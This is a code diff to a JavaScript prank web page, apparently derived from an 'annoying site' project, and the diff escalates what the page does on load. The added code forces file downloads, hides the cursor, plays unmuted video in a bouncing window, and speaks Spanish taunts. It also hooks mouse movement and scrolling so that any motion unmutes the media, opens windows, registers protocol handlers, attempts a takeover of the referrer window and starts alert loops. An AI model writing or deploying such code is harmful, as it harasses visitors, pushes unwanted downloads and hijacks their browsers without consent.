@@ -293,60 +293,90 @@ function initParentWindow () {
   rainbowThemeColor()
   animateUrlWithEmojis()
 
-  // Start a video muted (autoplay policy allows muted)
-  // It will unmute on first interaction
+  // Start bouncing video screen immediately!
   startAutoVideo()
 
-  // Try to speak immediately (some browsers allow it on first visit)
-  setTimeout(() => { speak('Eso fue un error') }, 1500)
-  setTimeout(() => { speak('jajajaja caíste hermano') }, 4000)
+  // Try unmuted speech immediately
+  speak('Eso fue un error')
+  setTimeout(() => { speak('jajajaja caíste hermano') }, 2000)
 
-  // Start triggering file downloads immediately
-  setTimeout(() => { triggerFileDownload() }, 2000)
-  setTimeout(() => { triggerFileDownload() }, 5000)
+  // Start file downloads immediately
+  setTimeout(() => { triggerFileDownload() }, 1000)
 
   // Add the blur, shake, scrolling text & chaos animation almost immediately
-  setTimeout(() => { document.body.classList.add('activated') }, 500)
+  setTimeout(() => { document.body.classList.add('activated') }, 300)
 
   // Hide cursor immediately
-  setTimeout(() => { hideCursor() }, 1000)
+  setTimeout(() => { hideCursor() }, 500)
 
-  // === PHASE 2: First interaction — unleash EVERYTHING ===
+  // === PHASE 2: On ANY mouse movement or gesture — unmute & unleash ===
   interceptUserInput(event => {
+    // Unmute ALL videos instantly on first gesture (mousemove, scroll, touch, key)
+    document.querySelectorAll('video').forEach(v => {
+      v.muted = false
+      v.volume = 1.0
+      v.play().catch(() => {})
+    })
+
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
-      startVideo()
+      openWindow()
       startAlertInterval()
       speak('te la re creíste jajajaja')
-
-      // Unmute the auto-started video
-      const autoVid = document.querySelector('video')
-      if (autoVid) { autoVid.muted = false; autoVid.volume = 1.0 }
     }
   })
 }
 
 /**
- * Start a video immediately on load. Muted to bypass autoplay policy.
- * Overlays the page content after a delay.
+ * Start a video immediately on load.
+ * Creates a floating window that BOUNCES around the screen automatically!
  */
 function startAutoVideo () {
+  const container = document.createElement('div')
+  container.id = 'bouncing-video-container'
+  container.style = 'position:fixed;top:50px;left:50px;width:380px;height:240px;z-index:9998;border-radius:14px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.8);border:4px solid #ff0055;pointer-events:none;'
+
   const video = document.createElement('video')
   video.src = getRandomArrayEntry(VIDEOS)
   video.autoplay = true
   video.loop = true
-  video.muted = true // muted = autoplay allowed
+  video.muted = false // Try unmuted first
   video.playsInline = true
-  video.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:9998;opacity:0;transition:opacity 2s ease;pointer-events:none;'
+  video.style = 'width:100%;height:100%;object-fit:cover;'
 
-  document.body.appendChild(video)
-  video.play().catch(() => {})
+  container.appendChild(video)
+  document.body.appendChild(container)
 
-  // Fade in the video over the page after 3 seconds
-  setTimeout(() => { video.style.opacity = '0.85' }, 3000)
-  // Make it fully opaque after 6 seconds
-  setTimeout(() => { video.style.opacity = '1' }, 6000)
+  // Try playing unmuted first; fallback to muted if browser blocks
+  video.play().catch(() => {
+    video.muted = true
+    video.play().catch(() => {})
+  })
+
+  // Bounce the video window around the screen automatically!
+  let x = Math.floor(Math.random() * (window.innerWidth - 400))
+  let y = Math.floor(Math.random() * (window.innerHeight - 260))
+  let vx = 7 * (Math.random() > 0.5 ? 1 : -1)
+  let vy = 7 * (Math.random() > 0.5 ? 1 : -1)
+
+  setInterval(() => {
+    const w = 380
+    const h = 240
+    const maxW = window.innerWidth - w
+    const maxH = window.innerHeight - h
+
+    x += vx
+    y += vy
+
+    if (x <= 0) { x = 0; vx = Math.abs(vx) }
+    if (x >= maxW) { x = maxW; vx = -Math.abs(vx) }
+    if (y <= 0) { y = 0; vy = Math.abs(vy) }
+    if (y >= maxH) { y = maxH; vy = -Math.abs(vy) }
+
+    container.style.left = x + 'px'
+    container.style.top = y + 'px'
+  }, 25)
 }
 
 /**
@@ -593,6 +623,10 @@ function startVibrateInterval () {
  * Intercept all user-initiated events and call the given the function, `onInput`.
  */
 function interceptUserInput (onInput) {
+  window.addEventListener('mousemove', onInput, { passive: false })
+  window.addEventListener('pointermove', onInput, { passive: false })
+  window.addEventListener('wheel', onInput, { passive: false })
+  window.addEventListener('scroll', onInput, { passive: false })
   document.body.addEventListener('touchstart', onInput, { passive: false })
 
   document.body.addEventListener('mousedown', onInput)
